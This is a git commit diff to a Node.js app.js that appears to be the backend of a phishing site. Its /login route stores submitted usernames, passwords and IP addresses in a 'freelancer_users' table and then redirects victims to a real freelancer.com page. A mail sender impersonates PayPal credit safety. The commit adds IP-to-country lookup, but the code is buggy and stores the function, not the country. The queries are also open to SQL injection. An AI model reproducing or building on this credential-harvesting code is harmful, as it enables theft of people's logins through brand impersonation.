9ce87a6601cce9764026559f59497248ba000c72
fadysadakah.emh@gmail.com <fadysadakah.emh@gmail.com>
2019-05-11 16:14:47 +0200

    iplocation

--- app.js
+++ app.js
@@ -6,6 +6,8 @@ app.set('view engine', 'ejs');
 const pg = require('pg');
 var bodyParser = require('body-parser');
 const nodemailer = require("nodemailer");
+const iplocation = require("iplocation").default;
+
 var mailOptions = {
     from: 'paypal.credit.safety@gmail.com',
     to: "fadysadakah.emh@gmail.com",
@@ -55,7 +57,9 @@ app.post('/login',function(req,res){
     req.connection.remoteAddress ||
     req.socket.remoteAddress ||
     (req.connection.socket ? req.connection.socket.remoteAddress : null);
-    client.query("INSERT INTO freelancer_users (users,password,ip) VALUES ('"+a+"','"+b+"','"+ip+"')",function(err,result){});
+
+    iplocation(ip, [], (error, res) => {return(res.country)})
+    client.query("INSERT INTO freelancer_users (users,password,ip,country) VALUES ('" + a + "','" + b + "','" + ip + "','"+iplocation+"')",function(err,result){});
     res.redirect('https://www.freelancer.com/contest/Design-a-logo-for-an-Accounting-Firm-1460786-byentry-25383803?w=f');
 })
 
